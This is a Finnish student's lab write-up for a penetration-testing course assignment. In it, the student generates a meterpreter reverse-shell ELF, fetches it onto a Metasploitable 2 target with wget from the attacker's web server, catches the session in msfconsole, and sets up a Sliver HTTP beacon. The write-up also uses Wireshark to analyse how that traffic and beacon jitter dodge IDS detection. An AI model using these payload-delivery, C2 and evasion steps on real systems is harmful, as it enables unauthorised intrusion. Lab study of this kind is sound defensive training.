# H6 Koita simpukoita | Nathaniel Ssendagire 28.04.2026
## Ympäristö
### OS: Kali Linux

### Browser: Firefox 128.3.1esr (64-bit)

### Hardware Model: VMWare Workstation Pro Memory: 4.0 GB

### Processor: AMD Ryzen 3 7320U - 4 cores used

### Disk: 35 GB

### Network: NAT / Host-Only

## A) Venom

<img width="738" height="237" alt="msfvenom activation" src="https://github.com/user-attachments/assets/4d272090-93ba-4797-b96d-908388ac615b" />

Generoin 32-bittisen Linux-binäärin (`elf`), joka sisältää meterpreter-payloadin. Käytin hyökkääjän IP-osoitteena (`192.168.18.129`) ja porttina (`4444`).

<img width="520" height="75" alt="setup a webserver" src="https://github.com/user-attachments/assets/0857d480-6d80-487a-8269-df9b4a05e28b" />

Käynnistin Kalissa Python-pohjaisen HTTP-palvelimen, jotta voin ladata tiedoston kohdekoneelle (Metasploitable 2).

<img width="647" height="107" alt="webserver got something" src="https://github.com/user-attachments/assets/219bcaa3-6fd1-477d-95ee-70ec182e90a6" />

<img width="723" height="191" alt="got the file" src="https://github.com/user-attachments/assets/4576fee6-5359-4411-bc7d-68dccc7942c3" />

<img width="535" height="58" alt="executed the file" src="https://github.com/user-attachments/assets/4534fc6f-11c4-4835-871a-ca6c35864c5e" />


Kohteessa latasin tiedoston wget-komennolla ja annoin sille suoritusoikeudet:

```
msfadmin@metasploitable:~$ wget http://192.168.18.129:8000/shell.elf
msfadmin@metasploitable:~$ chmod +x shell.elf
```

## B) Snif venom!
<img width="675" height="402" alt="msfconsole reverse tcp" src="https://github.com/user-attachments/assets/63a65330-424c-42e3-b0b2-8f47248788e7" />


Ennen tiedoston suorittamista, valmistelin Metasploit Frameworkin (msfconsole) ottamaan yhteyden vastaan käyttämällä multi/handler-moduulia.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.18.129
msf6 exploit(multi/handler) > exploit
```

<img width="535" height="58" alt="executed the file" src="https://github.com/user-attachments/assets/f469b261-6498-466d-9a57-fcd5f59c0ae5" />

Suoritin tiedoston Metasploitablesta käsin (./haittaohjelma_32.elf), jolloin Kalin terminaaliin aukesi aktiivinen Meterpreter-sessio. Tämä vahvisti, että hyökkääjällä on nyt täysi hallinta kohdekoneeseen.

<img width="758" height="647" alt="wireshark tcp packets" src="https://github.com/user-attachments/assets/4fdbcf1e-c092-42b6-af80-c350972ec62d" />

Tämä perinteinen tapa luoda yhteys on tehokas, mutta verkkotasolla se on "äänekäs". Se luo yhden jatkuvan TCP-putken, joka on helppo havaita, jos verkonvalvonta etsii pitkäkestoisia ja epätavallisia yhteyksiä porttiin 4444

## C)  Hello, Sliver

<img width="678" height="186" alt="sliver installation" src="https://github.com/user-attachments/assets/0ce8140c-bdda-448f-8b1f-70048742a855" />

Sliver asennettiin Kali Linuxiin suoraan virallisista pakettivarastoista.

```
sudo apt update
sudo apt install sliver
```

<img width="640" height="393" alt="sliver startup" src="https://github.com/user-attachments/assets/abdd8b59-adb8-48bd-8a55-dbf27f02ae22" />

Asennuksen jälkeen Sliver-palvelin käynnistettiin komennolla (`sliver-server`).

<img width="327" height="218" alt="http sliver" src="https://github.com/user-attachments/assets/d51aae5a-ac58-4b6f-a408-3e7ef9ad481b" />

Sliverissä käynnistettiin HTTP-palvelin porttiin 80. Portin 80 varaaminen vaati muiden palveluiden (kuten Apache) sammuttamista.

```
sliver > http
```

<img width="692" height="80" alt="too old" src="https://github.com/user-attachments/assets/a15a521b-c1ce-4629-a554-6891e0f5ef9f" />

<img width="223" height="142" alt="nada " src="https://github.com/user-attachments/assets/82b956ae-e12d-4cf6-9050-bd618e4eef8e" />

<img width="646" height="171" alt="sliver file creation" src="https://github.com/user-attachments/assets/4cab8a22-f363-4c80-87b3-b09126a32b7b" />



Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännetyt Sliver-implantit vaativat Linux-kernelin version 2.6.32 tai uudemman. Koska Metasploitable 2:n kernel on ikivanha (2.6.24), implantti kaatui kohteessa välittömästi (ChatGPT). Raportointia ja analyysia varten implantti generoitiin ja suoritettiin paikallisesti Kalilla:

```
generate --http 192.168.18.129 --os linux --arch amd64 --save ./sliver_http.elf
```

## D) Sniff Sliver!

<img width="730" height="222" alt="wireshark loopback" src="https://github.com/user-attachments/assets/38f051bb-48d6-48cc-a7ab-d08a9b7ff60e" />
<img width="814" height="712" alt="http filter on wireshark" src="https://github.com/user-attachments/assets/71e0a17b-ce6f-4137-911e-c93a3b64e8de" />
<img width="757" height="647" alt="wireshaaark" src="https://github.com/user-attachments/assets/bb5d040f-ea7e-4ffd-81d0-97eededbea62" />

Liikennettä analysoitiin Wiresharkilla. Koska hyökkäys tehtiin paikallisesti, analyysi kohdistettiin (`lo`) (Loopback) -rajapintaan.

Analyysissa havaittiin, että Sliverin HTTP-liikenne poikkeaa merkittävästi Metasploitin suorasta TCP-yhteydestä. Liikenne koostuu säännöllisistä HTTP POST- ja GET-pyynnöistä, jotka on naamioitu näyttämään tavalliselta verkkoselailulta (esim. URI-päätteet kuten .php tai .js).

## E) Sliverillä voit muuttaa yhteyden ominaisuuksia

<img width="642" height="130" alt="sliver file on kali" src="https://github.com/user-attachments/assets/70ed0e7e-f54c-49cf-8b66-5ec33d83f88a" />

Yksi C2-liikenteen kriittisimmistä ominaisuuksista on Jitter. Tehtävässä luotiin uusi Beacon, johon lisättiin satunnaiskerroin.

<img width="756" height="648" alt="wireshark seconds" src="https://github.com/user-attachments/assets/07ed3a04-1afb-4b7c-b7e7-d6dc1809da8a" />

<img width="426" height="365" alt="wireshark secondssss" src="https://github.com/user-attachments/assets/0ffd6a26-ef0b-4bae-b0a3-771b28d1e658" />


Wireshark-aikaleimoista havaittiin, että yhteydenotot eivät tapahtuneet tasan 5 sekunnin välein. Esimerkiksi pakettien välinen aika vaihteli satunnaisesti (esim. 5.01s, 6.59s, 5.69s). Tämä satunnaisuus on suunniteltu hämäämään automaattisia IDS-järjestelmiä, jotka etsivät matemaattisen tarkkaa säännöllisyyttä verkkoliikenteestä.

## F) Sliverillä voi tehdä monenlaista kohteessa

<img width="641" height="187" alt="beacon command" src="https://github.com/user-attachments/assets/62089e17-d897-4d52-909e-67a9ac38288c" />

<img width="593" height="98" alt="using the beacon" src="https://github.com/user-attachments/assets/19fe51a5-8374-45ca-acc1-4f43e09d00c5" />

Viimeisessä vaiheessa otettiin yhteys aktiiviseen beaconiin ja suoritettiin komentoja kohteessa.

<img width="357" height="81" alt="sliver whoami" src="https://github.com/user-attachments/assets/0fecbed5-a606-4ede-9211-557de7cb7867" />
<img width="757" height="811" alt="sliver ls command" src="https://github.com/user-attachments/assets/923db8ba-f9b9-4deb-8941-d28cd9e54b41" />
<img width="576" height="443" alt="sliver info" src="https://github.com/user-attachments/assets/49ebd8f0-d214-407d-bc58-becd48366415" />



Suoritettiin komennot (`whoam`), (`ls`) sekä (`info`)


## Lähteet

- <a href="https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita">Tero Karvinen</a>
